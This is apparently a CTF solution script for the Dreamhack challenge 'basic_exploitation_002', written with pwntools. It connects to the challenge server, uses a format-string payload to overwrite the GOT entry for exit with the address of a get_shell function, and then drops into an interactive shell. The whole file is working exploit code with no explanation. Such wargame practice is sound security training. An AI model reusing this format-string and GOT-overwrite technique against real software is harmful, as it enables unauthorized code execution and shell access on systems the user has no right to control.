from pwn import *

x = process('./basic_exploitation_002')
x = remote('host1.dreamhack.games', 17022)
e = ELF('./basic_exploitation_002')

payload = fmtstr_payload(1, {e.got['exit'] : e.symbols['get_shell']})
x.send(payload)

x.interactive()
